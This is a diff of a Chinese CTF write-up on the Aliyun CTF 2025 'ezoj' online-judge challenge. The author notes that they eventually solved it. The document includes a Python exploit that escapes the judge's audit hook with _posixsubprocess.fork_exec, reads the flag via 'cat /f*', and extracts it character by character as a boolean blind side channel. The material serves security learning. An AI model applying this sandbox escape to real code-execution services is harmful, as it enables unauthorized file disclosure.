@@ -328,7 +328,9 @@ url编码两次用gopher协议发包
 ![500](assets/Day%206/file-20251224202452764.png)
 
 # [阿里云CTF2025]ezoj
-这题不算复现吧，就算是学习了，想复现然后搞环境什么的搞了很久还是不行，应该是和题目环境有点差别，怎么都打不出来。但是理解了一下怎么做吧。
+这题不算复现吧，就算是学习了，想复现然后搞环境什么的搞了很久还是不行，应该是和题目环境有点差别，怎么都打不出来。但是理解了一下怎么做吧。（最后还是给我搞出来了。。。。）
+
+题目就是一个oj，可以自己写脚本做计算题，所对了会给你检查
 给了源码：
 ```python
 import os
@@ -551,7 +553,7 @@ flag = ""
 
 for i in range(0,50):
     for s in '-'+'}'+'{'+string.ascii_lowercase+string.digits:
-        json = {"problem_id":"0","code":f"import os\nimport _posixsubprocess\n_posixsubprocess.fork_exec([b\"anything\", \"-c\",\"import os;f=os.popen('cat /f*').read();\\nif f[{i}]=='{s}':print(2)\"], [b\"/bin/python3\"], True, (), None, None, -1, -1, -1, -1, -1,-1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)\n"}
+        json = {"problem_id":"1","code":f"import os\nimport _posixsubprocess\n_posixsubprocess.fork_exec([b\"anything\", \"-c\",\"import os;f=os.popen('cat /f*').read();\\nif f[{i}]=='{s}':print(2)\"], [b\"/bin/python3\"], True, (), None, None, -1, -1, -1, -1, -1,-1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)\n"}
         res = requests.post(url, json=json)
         if res.json()['message'] == "Wrang Answer: pass(1/10)":
             flag += s
@@ -565,3 +567,5 @@ for i in range(0,50):
 `Wrang Answer: pass(0/10)'
 这里就是先绕过钩子读取到flag，然后一个个对比，如果对上了一个字符就`print(2)`，
 这样进行布尔盲注。读取到flag
+![500](assets/Day%206/file-20251224224241544.png)
+真不容易
